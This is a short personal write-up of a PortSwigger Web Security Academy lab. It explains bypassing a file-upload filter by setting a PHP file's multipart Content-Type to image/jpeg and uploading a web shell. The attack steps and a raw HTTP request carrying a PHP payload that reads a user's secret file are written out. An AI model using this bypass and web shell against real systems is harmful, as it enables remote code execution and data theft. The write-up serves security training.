# [Web shell upload via Content-Type restriction bypass] — [PortSwigger] — [Apprentice]
**Date:** 2026-06-15
 
---
 
## Vulnerability / core concept
Content-Type Restriction Bypass

## What made me stuck
For some reason when i was trying to read the secret of carlos, it echoed secred twice concatenated so I spent some time figuring out why secret is not working even though I am getting it.
 
## What unblocked me
After inspection, I noticed that secret starts repeating, so I submitted the correct one.
 
---


## Attack path
1) First we need to log in to access file upload functionality.
2) During inspection, we can notice that we cannot simply upload `.php` file. Server returns error saying that content-type should be either `image/png` or `image/jpeg`.
3) After some testing with Accept, Content-Type headers, I noticed that when we are overwritting `Content-Type` from `application/x+php` to `image/png` or `image/jpeg`, we are able to successfully upload our `.php` file to the server.
4) This way we are bypassing `Content-Type` restriction and remotely execute code on the server. After reading `/home/carlos/secret` we can solve the lab.

---


## Payload / key command
```bash
POST /my-account/avatar HTTP/1.1
...

------geckoformboundary3012fb24018abd4df770ed8f67415ca
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>

------geckoformboundary3012fb24018abd4df770ed8f67415ca
Content-Disposition: form-data; name="user"
...
```
As you can see, we wrote `image/jpeg` to Content-Type to bypass the restriction.

---


## What I'd recognize faster next time
Even if application seems like it is restricting from uploading undesired types of files, it is important to check how effective these restrictions are. Like in this lab, it is possible that application restricts the type of upload only client-side, which can be easily bypassed with web proxies like Burp or Caido.
 

